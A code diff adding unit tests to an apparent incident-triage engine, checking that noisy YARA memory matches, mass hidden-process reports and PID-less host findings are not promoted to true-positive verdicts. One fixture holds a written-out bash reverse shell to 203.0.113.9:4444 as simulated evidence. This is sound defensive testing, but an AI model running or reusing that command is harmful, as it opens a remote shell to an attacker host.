@@ -166,6 +166,33 @@ class TestVerdictAssembly:
         v = _verdict_for(investigate(findings), 504)
         assert v.label in (VerdictLabel.FALSE_POSITIVE, VerdictLabel.NOISE_CLOSED)
 
+    def test_yara_anon_nonexec_memory_stays_weak_not_strong(self):
+        """Real bug caught live: module 12's regex ('ANONYMOUS EXECUTABLE|in ANONYMOUS')
+        matched analyze_memory_linux.py's NON-executable phrasing too ("matched in
+        anonymous rw- memory" legitimately contains "in anonymous"), so 19 coincidental
+        rule-pack matches inside one large process's ordinary heap (non-executable, no x
+        bit) got promoted to STRONG_BEHAVIORAL "code executing outside any loaded
+        module" and crossed the TP threshold on rule-pack noise alone."""
+        findings = [
+            _f('YARA Memory Match', f'Rule_{i} :: PID 700 (code)',
+              f"YARA rule 'Rule_{i}' matched in anonymous rw- memory. Matched strings: $a.")
+            for i in range(19)
+        ]
+        v = _verdict_for(investigate(findings), 700)
+        assert v.label != VerdictLabel.TRUE_POSITIVE
+        assert not any(d.name == 'M12_YARA_AnonExec' for d in v.dimensions)
+
+    def test_yara_anon_exec_memory_still_reaches_strong_tier(self):
+        """The genuine signal (rule fires in ANONYMOUS EXECUTABLE memory -- injected/
+        unbacked code) must still classify as STRONG_BEHAVIORAL; only the over-broad
+        'in ANONYMOUS' fallback alternative was the bug, not the exec-specific match."""
+        findings = [_f('YARA Memory Match', "Rule_x :: PID 701 (evil)",
+                       "YARA rule 'Rule_x' matched in ANONYMOUS EXECUTABLE memory (rwx) - "
+                       "injected/unbacked code.")]
+        v = _verdict_for(investigate(findings), 701)
+        assert any(d.name == 'M12_YARA_AnonExec' and d.tier == Tier.STRONG_BEHAVIORAL
+                  for d in v.dimensions)
+
     def test_dedup_collapses_repeated_identical_dimension(self):
         """One behavior described by many identical findings must count as
         ONE dimension, not N -- repetition is not independence."""
@@ -175,6 +202,47 @@ class TestVerdictAssembly:
         v = _verdict_for(investigate(findings), 505)
         # 50 identical-rationale findings must not fabricate 50 independent dimensions
         assert len(v.dimensions) < 5
+
+
+# ---------------------------------------------------------------------------
+# Hidden-process volume cross-check -- a DEFINITIVE claim assumes the memory
+# image's kernel symbols matched the captured kernel; that assumption can be
+# wrong (see engine.py's _cross_validate_hidden_process_volume docstring).
+# ---------------------------------------------------------------------------
+
+class TestHiddenProcessVolumeCrossCheck:
+    def test_single_hidden_process_stays_definitive_tp(self):
+        findings = [_f('Hidden Process (memory)', 'PID 900 (x)', 'hidden from pslist')]
+        v = _verdict_for(investigate(findings), 900)
+        assert v.label == VerdictLabel.TRUE_POSITIVE
+
+    def test_three_unrelated_hidden_processes_downgraded_not_auto_tp(self):
+        """Real bug caught live: a kernel-symbol-mismatched analysis run flagged 7
+        unrelated, mundane, short-lived utility PIDs (sh, id, ubuntu-report, an
+        accessibility daemon) as 'Hidden Process' all at once -- a rootkit has no
+        reason to hide processes like that. Volume alone should downgrade, not
+        auto-confirm, once there's no other reason any of them would be a target."""
+        findings = [_f('Hidden Process (memory)', f'PID {900+i} (util{i})', 'hidden from pslist')
+                   for i in range(3)]
+        verdicts = investigate(findings)
+        for i in range(3):
+            v = _verdict_for(verdicts, 900 + i)
+            assert v.label != VerdictLabel.TRUE_POSITIVE
+
+    def test_downgraded_hidden_process_still_corroborates_with_other_evidence(self):
+        """Downgraded to STRONG_BEHAVIORAL, not discarded -- a hidden process that
+        ALSO has enough other independent corroborating evidence still reaches TP
+        through the normal 3-dimension accumulation path."""
+        findings = [
+            _f('Hidden Process (memory)', 'PID 900 (a)', 'hidden from pslist'),
+            _f('Hidden Process (memory)', 'PID 901 (b)', 'hidden from pslist'),
+            _f('Hidden Process (memory)', 'PID 902 (c)', 'hidden from pslist'),
+            _f('External Connection From Untrusted Binary', 'PID: 900',
+              'ESTABLISHED to 203.0.113.9:4444'),
+            _f('Reverse Shell (memory)', 'PID 900', 'bash -i >& /dev/tcp/203.0.113.9/4444 0>&1'),
+        ]
+        v = _verdict_for(investigate(findings), 900)
+        assert v.label == VerdictLabel.TRUE_POSITIVE
 
 
 # ---------------------------------------------------------------------------
@@ -188,6 +256,25 @@ class TestHostScope:
         v = _verdict_for(investigate(findings), HOST_SCOPE_PID)
         assert v.label == VerdictLabel.TRUE_POSITIVE
         assert v.is_host_scope
+
+    def test_host_scope_does_not_reach_tp_from_unrelated_findings_alone(self):
+        """Real bug caught live: HOST_SCOPE_PID bundles every finding with no owning
+        process -- SUID baseline drift, a masquerading file, a cron job's file owner,
+        a staged credential-shaped file -- purely because none of them have a PID to
+        attach to, NOT because they're corroborating facts about one thread of
+        activity. On a real host this promoted host-scope findings (including this
+        session's own leftover test fixtures and the toolkit's own legitimate
+        egress-monitor cron job) to TRUE POSITIVE purely by accumulating 3+ unrelated
+        STRONG_BEHAVIORAL dimensions from different modules. Same accumulation for a
+        REAL pid (test_three_tier2_dimensions_reach_tp) must stay correct -- only
+        HOST_SCOPE_PID's accumulation path is disabled."""
+        findings = [
+            _f('Privileged Task Non-Root Binary', '/etc/cron.d/some-job', 'root cron, non-root-owned script'),
+            _f('MagicByte Mismatch', '/tmp/notes.txt', "ELF magic bytes in a '.txt' file"),
+            _f('Staged Credential Artifact', '/tmp/shadow.bak', 'credential-store-like file'),
+        ]
+        v = _verdict_for(investigate(findings), HOST_SCOPE_PID)
+        assert v.label != VerdictLabel.TRUE_POSITIVE
 
     def test_host_scope_and_pid_scope_are_independent_verdicts(self):
         findings = [
